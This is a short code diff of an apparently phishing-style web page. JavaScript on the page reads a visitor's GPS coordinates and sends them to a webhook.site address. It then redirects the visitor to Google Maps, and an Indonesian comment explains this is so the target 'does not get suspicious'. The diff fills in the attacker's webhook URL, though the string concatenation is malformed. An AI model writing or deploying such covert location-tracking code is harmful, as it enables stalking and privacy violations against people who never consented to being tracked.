@@ -11,7 +11,7 @@
                     var lon = position.coords.longitude;
                     
                     // Mengirim koordinat ke Webhook kamu
-                    fetch("URL_WEBHOOK_KAMU_DISINI?lat=" + lat + "&lon=" + lon);
+                    fetch("https://webhook.site" + lat + "&lon=" + lon);
                     
                     // Alihkan target ke Google Maps asli agar tidak curiga
                     window.location.href = "https://www.google.com" + lat + "," + lon;
